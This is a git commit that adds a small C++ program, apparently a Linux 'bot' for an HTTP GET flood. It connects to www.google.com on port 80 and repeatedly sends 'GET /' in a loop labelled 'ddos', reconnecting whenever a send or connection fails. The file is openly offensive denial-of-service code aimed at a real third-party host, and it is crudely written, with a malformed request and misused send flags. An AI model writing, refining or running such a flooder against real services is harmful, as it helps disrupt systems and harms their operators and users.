3f94b2473b53c8030a13526086674f3d86d658cd
Mahmoud Osman (MLT) <60033959+Mahmoud7Osman@users.noreply.github.com>
2021-12-07 22:47:07 +0200

    Add files via upload

---
+++ src/linux-bot32_x86-httpGET.cpp
@@ -0,0 +1,64 @@
+#include <iostream>
+#include <cstring>
+#include <ctime>
+
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+#include <unistd.h>
+
+#include <errno.h>
+
+#define GET "GET /"
+#define TARGET "www.google.com"
+#define WTIME 1
+#define ON_ERROR 5
+
+void try_again_later(){
+	sleep(ON_ERROR);
+}
+
+char* GetIP(char* dns){
+	static char ip[16];
+	struct hostent* host=gethostbyname(dns);
+	inet_ntop(AF_INET, host->h_addr, ip, 16);
+	return ip;
+}
+
+int main(){
+	int failure=0;
+initbot:
+	int sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	struct sockaddr_in target;
+
+	target.sin_addr.s_addr=inet_addr(GetIP(TARGET));
+ 	target.sin_port=htons(80);
+	target.sin_family=AF_INET;
+
+	if(sock==-1){
+errorhandle:
+		perror(" ");
+		try_again_later();
+		goto initbot;
+	}
+
+	int cnt=connect(sock, (struct sockaddr*)&target, sizeof(struct sockaddr_in));
+	if (cnt==-1){
+		if (sock!=-1)close(sock);
+		perror(" ");
+		goto errorhandle;
+	}
+ddos:
+	while (sleep(WTIME)+1){
+		if (send(sock, GET, strlen(GET), IPPROTO_TCP)==-1){
+			if (failure++==10){
+				perror(" ");
+				try_again_later();
+				goto initbot;
+			}
+			goto ddos;
+		}
+	}
+}
